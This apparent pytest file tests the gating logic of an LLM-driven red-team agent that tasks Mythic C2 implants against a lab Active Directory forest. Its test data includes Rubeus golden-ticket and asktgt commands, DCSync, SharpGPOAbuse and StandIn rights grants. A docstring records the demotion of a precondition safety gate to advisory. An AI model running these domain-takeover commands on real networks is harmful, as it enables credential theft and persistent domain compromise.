import asyncio
import base64
import hashlib
import json
import os
import re
import sys
from datetime import datetime, timedelta, timezone
from contextlib import contextmanager
from dataclasses import asdict
from pathlib import Path
from unittest.mock import patch

import pytest


sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "ai" / "langgraph"))
import access_reconciler  # noqa: E402
import adcs_certificate_materializer  # noqa: E402
import capabilities  # noqa: E402
import engagement_state  # noqa: E402
import engagement_ledger  # noqa: E402
import intent_classifier  # noqa: E402
import mythic_capability_adapter  # noqa: E402
import mythic_tools  # noqa: E402
import prompt_loader  # noqa: E402
from mythic_tools import MythicTools  # noqa: E402


def _make_tools() -> MythicTools:
    mt = MythicTools(agent_task_id="test")
    mt.client = object()
    return mt


@contextmanager
def _split_issue(output, calls=None, display_id=4242):
    """Patch the split issue path (issue_task + waitfor_for_task_output). issue_task increments
    calls['issue'] (if given) and returns a task with `display_id`; the wait returns `output`."""
    async def fake_issue_task(mythic, command_name, parameters, callback_display_id, wait_for_complete=True, timeout=None):
        if calls is not None:
            calls["issue"] = calls.get("issue", 0) + 1
            calls.setdefault("issued", []).append({
                "command_name": command_name,
                "parameters": parameters,
                "callback_display_id": callback_display_id,
            })
        return {"display_id": display_id}

    async def fake_waitfor(mythic, task_display_id, timeout=None):
        return output() if callable(output) else output

    with patch.object(mythic_tools.mythic, "issue_task", fake_issue_task), \
         patch.object(mythic_tools.mythic, "waitfor_for_task_output", fake_waitfor):
        yield


def _foothold(host="WINTERFELL", forest="north.local"):
    return engagement_state.Foothold(
        callback_id="50",
        agent="generic-agent",
        host=host,
        forest=forest,
        identity="NORTH\\arya",
        integrity="high",
        alive=True,
        source="test",
        timestamp="2026-06-06T12:00:00Z",
    )


def _seed_hop(mt: MythicTools, technique: str, target: str) -> None:
    state = engagement_state.record_hop_result(
        engagement_state.EngagementState(objective="test"),
        technique,
        target,
        "achieved",
        {"source": "test", "task_id": "seed"},
        "2026-06-06T12:00:00Z",
    )
    mt._engagement_hops = state.hops


def _seeded_reconcile(mt: MythicTools):
    async def fake_reconcile(mythic_tools_obj, now):
        return list(getattr(mt, "_engagement_footholds", []) or [])

    return fake_reconcile


def _proof_hop(effect, task_id, callback_id="", technique="capability:seed", target="seed"):
    evidence = {"mythic_task_id": task_id, "source": "test"}
    if callback_id:
        evidence["callback_id"] = callback_id
    return engagement_state.Hop(
        id=f"{technique}:{target}",
        technique=technique,
        target=target,
        effect=effect,
        status="achieved",
        evidence=evidence,
        preconditions=[],
        satisfied_effects=[effect],
        source="test",
        timestamp="2026-06-12T12:00:00Z",
    )


def _bloodhound_zip_bytes() -> bytes:
    import io
    import zipfile

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as archive:
        archive.writestr("users.json", json.dumps({"data": ["x" * 256]}))
    return buf.getvalue()


def _write_test_ca_artifact(path: Path) -> Path:
    from cryptography import x509
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.x509.oid import NameOID

    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    subject = issuer = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "LAB-CA")])
    now = datetime.now(timezone.utc)
    cert = (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(issuer)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now - timedelta(days=1))
        .not_valid_after(now + timedelta(days=3650))
        .add_extension(x509.BasicConstraints(ca=True, path_length=None), critical=True)
        .add_extension(x509.SubjectKeyIdentifier.from_public_key(key.public_key()), critical=False)
        .add_extension(
            x509.KeyUsage(
                digital_signature=True,
                content_commitment=False,
                key_encipherment=False,
                data_encipherment=False,
                key_agreement=False,
                key_cert_sign=True,
                crl_sign=True,
                encipher_only=False,
                decipher_only=False,
            ),
            critical=False,
        )
        .sign(key, hashes.SHA256())
    )
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(
        key.private_bytes(
            serialization.Encoding.PEM,
            serialization.PrivateFormat.PKCS8,
            serialization.NoEncryption(),
        )
        + cert.public_bytes(serialization.Encoding.PEM)
    )
    return path


def _write_test_ca_pfx(path: Path, password: str = "") -> Path:
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.primitives.serialization import pkcs12

    source = _write_test_ca_artifact(path.parent / f"{path.stem}.pem.txt")
    key, cert, _subject = adcs_certificate_materializer.load_ca_key_cert_from_artifact(
        source,
        "",
        "lab-ca",
    )
    path.write_bytes(pkcs12.serialize_key_and_certificates(
        name=b"lab-ca",
        key=key,
        cert=cert,
        cas=None,
        encryption_algorithm=(
            serialization.BestAvailableEncryption(password.encode())
            if password else
            serialization.NoEncryption()
        ),
    ))
    return path


def test_flag_off_no_op_does_not_invoke_gate():
    calls = {"issue": 0}
    mt = _make_tools()
    with patch.object(mt, "_engagement_issue_hook", side_effect=AssertionError("gate should not run")), \
        _split_issue("normal result", calls):
        result = asyncio.run(mt.issue_task_and_waitfor_task_output("whoami", "", 11))

    assert result == "normal result"
    assert calls["issue"] == 1


def test_issue_task_decodes_bytes_output_before_downstream_processing():
    mt = _make_tools()
    raw = (
        b"Directory listing for: C:\\Users\\Public\r\n\r\n"
        b"-rw-rw-rw-\t2026-06-26 18:16:55\t1234\tbloodhound_ab12cd34.zip\r\n"
    )

    with _split_issue(raw):
        result = asyncio.run(mt.issue_task_and_waitfor_task_output("whoami", "", 11))

    assert result == raw.decode("utf-8")
    assert not result.startswith("b'")


def test_accepted_mythic_task_emits_boundary_lifecycle_events():
    mt = _make_tools()
    events = []
    mt.set_execution_observer(events.append)

    with _split_issue("NORTH\\arya", display_id=4242):
        result = asyncio.run(mt.issue_task_and_waitfor_task_output("whoami", "", 11))

    assert result == "NORTH\\arya"
    assert [event["status"] for event in events] == ["started", "completed"]
    assert {event["event_id"] for event in events} == {"mythic-task:11:4242"}
    assert events[0]["tool_name"] == "whoami"
    assert events[0]["task_id"] == 4242
    assert events[1]["result_preview"] == "NORTH\\arya"
    assert events[1]["output"] == "NORTH\\arya"


def test_mythic_task_event_inherits_policy_decision_provenance():
    mt = _make_tools()
    events = []
    mt.set_execution_observer(events.append)
    policy_decision = {
        "episode_id": "episode-1",
        "decision_id": "decision-1",
        "policy_mode": "llm",
    }

    with _split_issue("NORTH\\arya", display_id=4242):
        asyncio.run(mt.issue_task_and_waitfor_task_output(
            "whoami",
            "",
            11,
            visibility_context={
                "capability": "prove-access",
                "purpose": "verify identity",
                "policy_decision": policy_decision,
            },
        ))

    assert events[0]["episode_id"] == "episode-1"
    assert events[0]["decision_id"] == "decision-1"
    assert events[0]["policy_mode"] == "llm"


def test_issue_task_refuses_dead_callback_before_mythic_tasking():
    calls = {"issue": 0}
    mt = _make_tools()

    async def dead_liveness(client, display_id):
        return {
            "display_id": display_id,
            "status": "dead",
            "alive": False,
            "seconds_since_checkin": 14400,
            "effective_sleep_seconds": 3,
            "threshold_seconds": 45,
            "reason": "no checkin for 14400s (≈4h0m); interval 3s, jitter 0% → dead threshold 45s",
        }

    with patch.object(mythic_tools, "assess_callback_liveness", dead_liveness), \
        _split_issue("should not issue", calls):
        result = asyncio.run(mt.issue_task_and_waitfor_task_output("whoami", "", 13, timeout=5))

    assert "STOP — callback 13 is not taskable: dead" in result
    assert "no checkin for 14400s" in result
    assert calls["issue"] == 0


def test_existing_gpo_effect_no_longer_short_circuits_issue_path():
    calls = {"issue": 0}

    async def fake_reconcile(mythic_tools_obj, now):
        return []

    mt = _make_tools()
    _seed_hop(mt, "gpo-abuse", "winterfell")
    with patch.object(access_reconciler, "reconcile_access", fake_reconcile), \
        _split_issue("should not issue", calls):
        result = asyncio.run(
            mt.issue_task_and_waitfor_task_output(
                "execute_assembly",
                "--Assembly SharpGPOAbuse.exe --GPOName winterfell",
                11,
            )
        )

    assert result == "should not issue"
    assert calls["issue"] == 1


def test_gate_demotes_missing_preconditions_to_advisory_and_proceeds():
    """RCA 2026-06-09: a missing-precondition would-DEFER is ADVISORY, not a veto. The hand-built STRIPS
    precondition model produced fatal false-negatives — it refused 167/168 correct hops in solve #37 and
    deadlocked every run after hop 1 (the StandIn rights-grant DEFERd for `write-dacl:domain`, which nothing
    in the model emits from GPO control; `dcsync` DEFERd for the `ds-replication-rights` only that grant
    produces). The agent cannot route around Sage's own refusal, so each modeling gap = a fatal deadlock.
    The live target is the oracle: proceed and let execution judge. Already-achieved SKIP (dedup) still
    blocks (see test_gate_skip_short_circuits_existing_gpo_effect); only the precondition DEFER is demoted."""
    calls = {"issue": 0}

    async def fake_reconcile(mythic_tools_obj, now):
        return [_foothold(host="WINTERFELL", forest="north.local")]

    mt = _make_tools()
    with patch.object(access_reconciler, "reconcile_access", fake_reconcile), \
        _split_issue("proceeded — real task output", calls):
        result = asyncio.run(
            mt.issue_task_and_waitfor_task_output(
                "standin",
                '--object "CN=Domain,CN=System,DC=essos,DC=local" --grant NORTH\\arya',
                11,
            )
        )

    assert "deferred" not in result, "a missing-precondition hop must NO LONGER be vetoed by the gate"
    assert result == "proceeded — real task output"
    assert calls["issue"] == 1, "the would-defer hop must proceed to a real Mythic task (target is the oracle)"


def test_collect_graph_inflight_marker_is_task_backed_after_issue(monkeypatch):
    calls = {"issue": 0}
    foothold = _foothold(host="CASTELBLACK", forest="north.sevenkingdoms.local")
    state = engagement_state.EngagementState(objective="test", footholds=[foothold])
    access_key = engagement_state.access_context_key(state, foothold)

    async def fake_reconcile(mythic_tools_obj, now):
        return [foothold]

    async def fake_tasks(*args, **kwargs):
        return []

    mt = _make_tools()
    mt._assembly_file_checks.add("sharphound.exe")
    with patch.object(access_reconciler, "reconcile_access", fake_reconcile), \
        patch.object(mythic_tools.mythic, "get_all_tasks", fake_tasks), \
        _split_issue("SharpHound completed", calls, display_id=777):
        result = asyncio.run(
            mt.issue_task_and_waitfor_task_output(
                "execute_assembly",
                {"assembly": "SharpHound.exe", "arguments": "-c All --SearchForest"},
                50,
                timeout=5,
            )
        )

    assert result == "SharpHound completed"
    assert calls["issue"] == 1
    assert mt._collection_in_flight[access_key]["task_id"] == "777"
    assert mt._collection_in_flight[access_key]["command"] == "execute_assembly"


def test_collect_graph_targeted_scope_uses_distinct_inflight_key(monkeypatch):
    calls = {"issue": 0}
    foothold = _foothold(host="CASTELBLACK", forest="north.sevenkingdoms.local")
    base = engagement_state.EngagementState(objective="test", footholds=[foothold])
    default_key = engagement_state.collection_target_key(base, foothold)
    targeted_key = engagement_state.collection_target_key(base, foothold, "essos.local")
    achieved = engagement_state.record_hop_result(
        base,
        "collect-graph",
        default_key,
        "achieved",
        {
            "source": "ingest_collection",
            "graph_verified": True,
            "covered_domains": ["north.sevenkingdoms.local"],
        },
        "2026-06-17T00:00:00Z",
    )

    async def fake_reconcile(mythic_tools_obj, now):
        return [foothold]

    async def fake_tasks(*args, **kwargs):
        return []

    mt = _make_tools()
    mt._assembly_file_checks.add("sharphound.exe")
    mt._engagement_hops = achieved.hops
    mt._engagement_graph_facts = [
        engagement_state.GraphFact(
            "domain-collected:north.sevenkingdoms.local",
            "bloodhound:domain_info",
            "2026-06-17T00:00:00Z",
            600,
        )
    ]
    with patch.object(access_reconciler, "reconcile_access", fake_reconcile), \
        patch.object(mythic_tools.mythic, "get_all_tasks", fake_tasks), \
        _split_issue("SharpHound completed", calls, display_id=778):
        result = asyncio.run(
            mt.issue_task_and_waitfor_task_output(
                "execute_assembly",
                {
                    "assembly_name": "SharpHound.exe",
                    "assembly_arguments": "-c All --Domain essos.local --OutputDirectory C:\\Users\\Public",
                },
                50,
                timeout=5,
            )
        )

    assert result == "SharpHound completed"
    assert calls["issue"] == 1
    assert default_key not in mt._collection_in_flight
    assert mt._collection_in_flight[targeted_key]["task_id"] == "778"


def test_collect_graph_unbacked_inflight_marker_self_heals_and_issues(monkeypatch):
    calls = {"issue": 0}
    foothold = _foothold(host="CASTELBLACK", forest="north.sevenkingdoms.local")
    state = engagement_state.EngagementState(objective="test", footholds=[foothold])
    access_key = engagement_state.access_context_key(state, foothold)

    async def fake_reconcile(mythic_tools_obj, now):
        return [foothold]

    async def fake_tasks(*args, **kwargs):
        return []

    mt = _make_tools()
    mt._assembly_file_checks.add("sharphound.exe")
    mt._collection_in_flight[access_key] = {"kind": "collect-graph", "key": access_key}
    with patch.object(access_reconciler, "reconcile_access", fake_reconcile), \
        patch.object(mythic_tools.mythic, "get_all_tasks", fake_tasks), \
        _split_issue("SharpHound completed", calls, display_id=778):
        result = asyncio.run(
            mt.issue_task_and_waitfor_task_output(
                "execute_assembly",
                {"assembly": "SharpHound.exe", "arguments": "-c All --SearchForest"},
                50,
                timeout=5,
            )
        )

    assert result == "SharpHound completed"
    assert calls["issue"] == 1
    assert mt._collection_in_flight[access_key]["task_id"] == "778"


def test_collect_graph_backed_inflight_marker_blocks_with_task_id(monkeypatch):
    calls = {"issue": 0}
    foothold = _foothold(host="CASTELBLACK", forest="north.sevenkingdoms.local")
    state = engagement_state.EngagementState(objective="test", footholds=[foothold])
    access_key = engagement_state.access_context_key(state, foothold)

    async def fake_reconcile(mythic_tools_obj, now):
        return [foothold]

    async def fake_tasks(*args, **kwargs):
        return [{"display_id": 779, "status": "agent_processing", "completed": False}]

    mt = _make_tools()
    mt._assembly_file_checks.add("sharphound.exe")
    mt._collection_in_flight[access_key] = {
        "kind": "collect-graph",
        "key": access_key,
        "task_id": "779",
        "callback_id": "50",
    }
    with patch.object(access_reconciler, "reconcile_access", fake_reconcile), \
        patch.object(mythic_tools.mythic, "get_all_tasks", fake_tasks), \
        _split_issue("should not issue", calls):
        result = asyncio.run(
            mt.issue_task_and_waitfor_task_output(
                "execute_assembly",
                {"assembly": "SharpHound.exe", "arguments": "-c All --SearchForest"},
                50,
                timeout=5,
            )
        )

    assert "Mythic task #779" in result
    assert "already in-flight" in result
    assert calls["issue"] == 0


def test_collect_graph_completed_marker_blocks_when_valid_artifact_exists(monkeypatch):
    foothold = _foothold(host="CASTELBLACK", forest="north.sevenkingdoms.local")
    state = engagement_state.EngagementState(objective="test", footholds=[foothold])
    access_key = engagement_state.access_context_key(state, foothold)

    async def fake_tasks(*args, **kwargs):
        return [{"display_id": 781, "status": "success", "completed": True}]

    async def fake_latest(callback_id, name_contains):
        return {"agent_file_id": "file-valid", "filename_utf8": "bloodhound.zip"}

    async def fake_download(*args, **kwargs):
        return _bloodhound_zip_bytes()

    mt = _make_tools()
    mt._collection_in_flight[access_key] = {
        "kind": "collect-graph",
        "key": access_key,
        "task_id": "781",
        "callback_id": "50",
    }

    with patch.object(mythic_tools.mythic, "get_all_tasks", fake_tasks), \
        patch.object(mt, "_latest_download_for_callback", fake_latest), \
        patch.object(mythic_tools.mythic, "download_file", fake_download):
        result = asyncio.run(mt._collection_in_flight_blocker(access_key))

    assert "skipped" in result
    assert "already launched and completed" in result
    assert access_key in mt._collection_in_flight


def test_collect_graph_completed_marker_self_heals_when_no_artifact(monkeypatch):
    foothold = _foothold(host="CASTELBLACK", forest="north.sevenkingdoms.local")
    state = engagement_state.EngagementState(objective="test", footholds=[foothold])
    access_key = engagement_state.access_context_key(state, foothold)

    async def fake_tasks(*args, **kwargs):
        return [{"display_id": 782, "status": "completed", "completed": True}]

    async def fake_latest(callback_id, name_contains):
        return None

    mt = _make_tools()
    mt._collection_in_flight[access_key] = {
        "kind": "collect-graph",
        "key": access_key,
        "task_id": "782",
        "callback_id": "50",
    }

    with patch.object(mythic_tools.mythic, "get_all_tasks", fake_tasks), \
        patch.object(mt, "_latest_download_for_callback", fake_latest):
        result = asyncio.run(mt._collection_in_flight_blocker(access_key))

    assert result is None
    assert access_key not in mt._collection_in_flight


def test_collect_graph_completed_marker_self_heals_when_artifact_is_invalid(monkeypatch):
    foothold = _foothold(host="CASTELBLACK", forest="north.sevenkingdoms.local")
    state = engagement_state.EngagementState(objective="test", footholds=[foothold])
    access_key = engagement_state.access_context_key(state, foothold)

    async def fake_tasks(*args, **kwargs):
        return [{"display_id": 783, "status": "success", "completed": True}]

    async def fake_latest(callback_id, name_contains):
        return {"agent_file_id": "file-invalid", "filename_utf8": "bloodhound.zip"}

    async def fake_download(*args, **kwargs):
        return b"Option 'o' is unknown. Usage: SharpHound.exe -c All"

    mt = _make_tools()
    mt._collection_in_flight[access_key] = {
        "kind": "collect-graph",
        "key": access_key,
        "task_id": "783",
        "callback_id": "50",
    }

    with patch.object(mythic_tools.mythic, "get_all_tasks", fake_tasks), \
        patch.object(mt, "_latest_download_for_callback", fake_latest), \
        patch.object(mythic_tools.mythic, "download_file", fake_download):
        result = asyncio.run(mt._collection_in_flight_blocker(access_key))

    assert result is None
    assert access_key not in mt._collection_in_flight


def test_collect_graph_completed_failed_status_preserves_existing_self_heal(monkeypatch):
    foothold = _foothold(host="CASTELBLACK", forest="north.sevenkingdoms.local")
    state = engagement_state.EngagementState(objective="test", footholds=[foothold])
    access_key = engagement_state.access_context_key(state, foothold)
    calls = {"latest": 0}

    async def fake_tasks(*args, **kwargs):
        return [{"display_id": 784, "status": "error", "completed": True}]

    async def fake_latest(callback_id, name_contains):
        calls["latest"] += 1
        return {"agent_file_id": "should-not-check"}

    mt = _make_tools()
    mt._collection_in_flight[access_key] = {
        "kind": "collect-graph",
        "key": access_key,
        "task_id": "784",
        "callback_id": "50",
    }

    with patch.object(mythic_tools.mythic, "get_all_tasks", fake_tasks), \
        patch.object(mt, "_latest_download_for_callback", fake_latest):
        result = asyncio.run(mt._collection_in_flight_blocker(access_key))

    assert result is None
    assert access_key not in mt._collection_in_flight
    assert calls["latest"] == 0


def test_collect_graph_completed_marker_blocks_when_artifact_status_unknown(monkeypatch):
    foothold = _foothold(host="CASTELBLACK", forest="north.sevenkingdoms.local")
    state = engagement_state.EngagementState(objective="test", footholds=[foothold])
    access_key = engagement_state.access_context_key(state, foothold)

    async def fake_tasks(*args, **kwargs):
        return [{"display_id": 785, "status": "success", "completed": True}]

    async def fake_latest(callback_id, name_contains):
        raise RuntimeError("metadata unavailable")

    mt = _make_tools()
    mt._collection_in_flight[access_key] = {
        "kind": "collect-graph",
        "key": access_key,
        "task_id": "785",
        "callback_id": "50",
    }

    with patch.object(mythic_tools.mythic, "get_all_tasks", fake_tasks), \
        patch.object(mt, "_latest_download_for_callback", fake_latest):
        result = asyncio.run(mt._collection_in_flight_blocker(access_key))

    assert "skipped" in result
    assert "already launched and completed" in result
    assert access_key in mt._collection_in_flight


def test_collect_graph_completed_marker_blocks_when_artifact_fetch_unknown(monkeypatch):
    foothold = _foothold(host="CASTELBLACK", forest="north.sevenkingdoms.local")
    state = engagement_state.EngagementState(objective="test", footholds=[foothold])
    access_key = engagement_state.access_context_key(state, foothold)

    async def fake_tasks(*args, **kwargs):
        return [{"display_id": 786, "status": "success", "completed": True}]

    async def fake_latest(callback_id, name_contains):
        return {"agent_file_id": "file-unknown", "filename_utf8": "bloodhound.zip"}

    async def fake_download(*args, **kwargs):
        raise RuntimeError("download unavailable")

    mt = _make_tools()
    mt._collection_in_flight[access_key] = {
        "kind": "collect-graph",
        "key": access_key,
        "task_id": "786",
        "callback_id": "50",
    }

    with patch.object(mythic_tools.mythic, "get_all_tasks", fake_tasks), \
        patch.object(mt, "_latest_download_for_callback", fake_latest), \
        patch.object(mythic_tools.mythic, "download_file", fake_download):
        result = asyncio.run(mt._collection_in_flight_blocker(access_key))

    assert "skipped" in result
    assert "already launched and completed" in result
    assert access_key in mt._collection_in_flight


def test_stage_b_collect_graph_skip_requires_graph_corroboration(monkeypatch):
    foothold = _foothold(host="CASTELBLACK", forest="north.sevenkingdoms.local")
    state = engagement_state.EngagementState(objective="test", footholds=[foothold])
    access_key = engagement_state.access_context_key(state, foothold)

    async def fake_reconcile(mythic_tools_obj, now):
        return [foothold]

    async def fake_tasks(*args, **kwargs):
        return []

    achieved = engagement_state.record_hop_result(
        engagement_state.EngagementState(objective="test"),
        "collect-graph",
        access_key,
        "achieved",
        {"source": "ingest_collection", "graph_verified": True},
        "2026-06-17T00:00:00Z",
    )

    mt = _make_tools()
    mt._assembly_file_checks.add("sharphound.exe")
    mt._engagement_hops = achieved.hops
    calls = {"issue": 0}
    with patch.object(access_reconciler, "reconcile_access", fake_reconcile), \
        patch.object(mythic_tools.mythic, "get_all_tasks", fake_tasks), \
        _split_issue("SharpHound rerun allowed", calls, display_id=780):
        result = asyncio.run(
            mt.issue_task_and_waitfor_task_output(
                "execute_assembly",
                {"assembly": "SharpHound.exe", "arguments": "-c All --SearchForest"},
                50,
                timeout=5,
            )
        )

    assert result == "SharpHound rerun allowed"
    assert calls["issue"] == 1

    mt2 = _make_tools()
    mt2._assembly_file_checks.add("sharphound.exe")
    mt2._engagement_hops = achieved.hops
    mt2._engagement_graph_facts = [
        engagement_state.GraphFact(
            "domain-collected:north.sevenkingdoms.local",
            "bloodhound:domain_info",
            "2026-06-17T00:00:00Z",
            600,
        )
    ]
    calls2 = {"issue": 0}
    with patch.object(access_reconciler, "reconcile_access", fake_reconcile), \
        patch.object(mythic_tools.mythic, "get_all_tasks", fake_tasks), \
        _split_issue("should not issue", calls2):
        skipped = asyncio.run(
            mt2.issue_task_and_waitfor_task_output(
                "execute_assembly",
                {"assembly": "SharpHound.exe", "arguments": "-c All --SearchForest"},
                50,
                timeout=5,
            )
        )

    assert "skipped: graph already built" in skipped
    assert calls2["issue"] == 0


def test_operator_requested_collection_overrides_same_scope_graph_skip(monkeypatch):
    foothold = _foothold(host="CASTELBLACK", forest="north.sevenkingdoms.local")
    state = engagement_state.EngagementState(objective="test", footholds=[foothold])
    access_key = engagement_state.access_context_key(state, foothold)

    async def fake_reconcile(mythic_tools_obj, now):
        return [foothold]

    async def fake_tasks(*args, **kwargs):
        return []

    achieved = engagement_state.record_hop_result(
        engagement_state.EngagementState(objective="test"),
        "collect-graph",
        access_key,
        "achieved",
        {
            "source": "ingest_collection",
            "graph_verified": True,
            "covered_domains": ["north.sevenkingdoms.local"],
        },
        "2026-06-17T00:00:00Z",
    )

    mt = _make_tools()
    mt._assembly_file_checks.add("sharphound.exe")
    mt._engagement_hops = achieved.hops
    mt._engagement_graph_facts = [
        engagement_state.GraphFact(
            "domain-collected:north.sevenkingdoms.local",
            "bloodhound:domain_info",
            "2026-06-17T00:00:00Z",
            600,
        )
    ]
    mt.begin_operator_turn(
        "Run a SharpHound collection against north.sevenkingdoms.local and ingest the data into BloodHound."
    )
    calls = {"issue": 0}
    with patch.object(access_reconciler, "reconcile_access", fake_reconcile), \
        patch.object(mythic_tools.mythic, "get_all_tasks", fake_tasks), \
        _split_issue("SharpHound completed", calls, display_id=780):
        result = asyncio.run(
            mt.issue_task_and_waitfor_task_output(
                "execute_assembly",
                {
                    "assembly": "SharpHound.exe",
                    "arguments": "-c All --SearchForest --ZipFilename bloodhound_fresh.zip",
                },
                50,
                timeout=5,
            )
        )

    assert result == "SharpHound completed"
    assert calls["issue"] == 1
    assert mt._operator_collection_request["launched_task_id"] == "780"
    assert mt._operator_collection_request["expected_zip_suffix"] == "bloodhound_fresh.zip"


def test_operator_collection_request_classifier_ignores_questions_and_inhibits():
    assert mythic_tools._operator_requested_collection(
        "Run a SharpHound collection against lab.local and ingest it."
    ) is True
    assert mythic_tools._operator_requested_collection(
        "I need to run a SharpHound collection against lab.local."
    ) is True
    assert mythic_tools._operator_requested_collection(
        "Why did Sage refuse to run a SharpHound collection?"
    ) is False
    assert mythic_tools._operator_requested_collection(
        "Do not run a SharpHound collection; just explain the prior result."
    ) is False


def test_operator_requested_collection_rejects_historical_ingest_before_new_launch():
    mt = _make_tools()
    mt.begin_operator_turn(
        "Run a SharpHound collection against north.sevenkingdoms.local and ingest the data into BloodHound."
    )

    result = json.loads(asyncio.run(mt.ingest_collection(file_uuid="old-file-uuid")))

    assert result["status"] == "fresh_collection_required"
    assert result["operator_requested_recollection"] is True
    assert "historical ZIP" in result["error"]


def test_ingest_collection_no_download_reports_non_retryable_fresh_collection_path(monkeypatch):
    mt = _make_tools()

    async def fake_latest_download(callback_display_id, name_contains):
        return None

    async def fake_sleep(*_args, **_kwargs):
        return None

    monkeypatch.setattr(mt, "_latest_download_for_callback", fake_latest_download)
    monkeypatch.setattr(mythic_tools.asyncio, "sleep", fake_sleep)

    result = json.loads(asyncio.run(mt.ingest_collection(callback_display_id=1)))

    assert result["status"] == "no_collection_artifact"
    assert result["retryable_by_reingest"] is False
    assert "no existing collection artifact" in result["error"]
    assert "Do not retry ingest_collection" in result["next_action"]
    assert "run one fresh SharpHound/AzureHound collection" in result["next_action"]


def test_operator_requested_collection_rejects_wrong_zip_after_new_launch(monkeypatch):
    mt = _make_tools()
    mt.begin_operator_turn(
        "Run a SharpHound collection against north.sevenkingdoms.local and ingest the data into BloodHound."
    )
    mt._operator_collection_request.update({
        "launched_task_id": "780",
        "callback_id": "50",
        "expected_zip_suffix": "bloodhound_fresh.zip",
    })

    async def fake_meta(file_uuid):
        return {
            "filename_utf8": "20260701170726_bloodhound_old.zip",
            "task": {"callback": {"display_id": 50}},
        }

    monkeypatch.setattr(mt, "_get_file_metadata", fake_meta)

    result = json.loads(asyncio.run(mt.ingest_collection(file_uuid="old-file-uuid")))

    assert result["status"] == "fresh_collection_artifact_required"
    assert result["collector_task_id"] == "780"
    assert result["expected_zip_suffix"] == "bloodhound_fresh.zip"
    assert result["actual_filename"] == "20260701170726_bloodhound_old.zip"


def test_stage_b_dcsync_precheck_blocks_then_caps_through_issue_hook(monkeypatch):
    foothold = _foothold(host="CASTELBLACK", forest="north.sevenkingdoms.local")

    async def fake_reconcile(mythic_tools_obj, now):
        return [foothold]

    mt = _make_tools()
    mt._engagement_graph_facts = [
        engagement_state.GraphFact(
            "domain:north.sevenkingdoms.local",
            "bloodhound:domain_info",
            "2026-06-17T00:00:00Z",
            600,
        )
    ]
    calls = {"issue": 0}
    params = {"domain": "north.sevenkingdoms.local"}

    with patch.object(access_reconciler, "reconcile_access", fake_reconcile), \
        _split_issue("Hash NTLM: 2b576acbe6bcfda7294d6bd18041b8fe", calls):
        first = asyncio.run(mt.issue_task_and_waitfor_task_output("dcsync", params, 50, timeout=5))
        second = asyncio.run(mt.issue_task_and_waitfor_task_output("dcsync", params, 50, timeout=5))
        third = asyncio.run(mt.issue_task_and_waitfor_task_output("dcsync", params, 50, timeout=5))

    assert "DCSync of north.sevenkingdoms.local not attempted" in first
    assert "DCSync of north.sevenkingdoms.local not attempted" in second
    assert "Hash NTLM:" in third
    assert calls["issue"] == 1
    assert mt._dcsync_precheck_blocks[("dcsync", "north.sevenkingdoms.local")] == mt._DCSYNC_PRECHECK_MAX_BLOCKS


def test_ticket_gate_blocks_prompt_built_rubeus_before_tasking():
    calls = {"issue": 0}

    async def fake_reconcile(mythic_tools_obj, now):
        return [_foothold(host="CASTELBLACK", forest="north.sevenkingdoms.local")]

    mt = _make_tools()
    mt._engagement_hops = engagement_state.record_hop_result(
        engagement_state.EngagementState(objective="test"),
        "dcsync",
        "north.sevenkingdoms.local",
        "achieved",
        {"source": "test", "provenance": "run", "artifact_present": True},
        "2026-06-11T00:00:00Z",
    ).hops

    with patch.object(access_reconciler, "reconcile_access", fake_reconcile), \
        _split_issue("should not issue", calls):
        result = asyncio.run(
            mt.issue_task_and_waitfor_task_output(
                "execute_assembly",
                {
                    "assembly_name": "Rubeus.exe",
                    "assembly_arguments": (
                        "golden /user:Administrator /domain:north.sevenkingdoms.local "
                        "/sid:S-1-5-21-111-222-333 /sids:S-1-5-21-444-555-666-519 /ptt"
                    ),
                },
                8,
            )
        )

    assert "Kerberos ticket command not attempted" in result
    assert "build_capability_commands" in result
    assert calls["issue"] == 0


def test_ticket_gate_blocks_prompt_built_asktgt_before_tasking():
    calls = {"issue": 0}

    async def fake_reconcile(mythic_tools_obj, now):
        return [_foothold(host="CASTELBLACK", forest="north.sevenkingdoms.local")]

    mt = _make_tools()
    command = {
        "assembly_name": "Rubeus.exe",
        "assembly_arguments": (
            "asktgt /user:alice /domain:lab.local "
            f"/aes256:{'a' * 64} /nowrap"
        ),
    }

    with patch.object(access_reconciler, "reconcile_access", fake_reconcile), \
        _split_issue("should not issue", calls):
        result = asyncio.run(
            mt.issue_task_and_waitfor_task_output(
                "execute_assembly",
                command,
                8,
            )
        )

    assert "Kerberos ticket command not attempted" in result
    assert "build_capability_commands" in result
    assert calls["issue"] == 0


def test_ticket_gate_allows_builder_emitted_managed_kerberos_forge_command():
    calls = {"issue": 0}

    async def fake_reconcile(mythic_tools_obj, now):
        return [_foothold(host="CASTELBLACK", forest="north.sevenkingdoms.local")]

    mt = _make_tools()
    mt._engagement_hops = engagement_state.record_hop_result(
        engagement_state.EngagementState(objective="test"),
        "dcsync",
        "north.sevenkingdoms.local",
        "achieved",
        {"source": "test", "provenance": "run", "artifact_present": True},
        "2026-06-11T00:00:00Z",
    ).hops
    command = {
        "assembly_name": "Rubeus.exe",
        "assembly_arguments": (
            "golden /user:Administrator /domain:north.sevenkingdoms.local "
            f"/sid:S-1-5-21-111-222-333 /aes256:{'a' * 64} "
            "/sids:S-1-5-21-444-555-666-519 /nowrap"
        ),
    }
    mt._deterministic_ticket_command_keys.add(mythic_tools._ticket_command_key("execute_assembly", command))
    proof_output = "SEVENKINGDOMS\\Domain Admins Enabled group\nThe command completed successfully."

    with patch.object(access_reconciler, "reconcile_access", fake_reconcile), \
        _split_issue(proof_output, calls, display_id=5150):
        result = asyncio.run(
            mt.issue_task_and_waitfor_task_output(
                "execute_assembly",
                command,
                8,
            )
        )

    assert result == proof_output
    assert calls["issue"] == 1
    hop = mt._engagement_hops[-1]
    assert hop.technique == "sid-history-escalation"
    assert hop.status == "achieved"
    assert hop.evidence["verified_on_record"] is True
    assert hop.evidence["mythic_task_id"] == 5150


def test_ensure_kerberos_context_forge_is_not_skipped_by_durable_da():
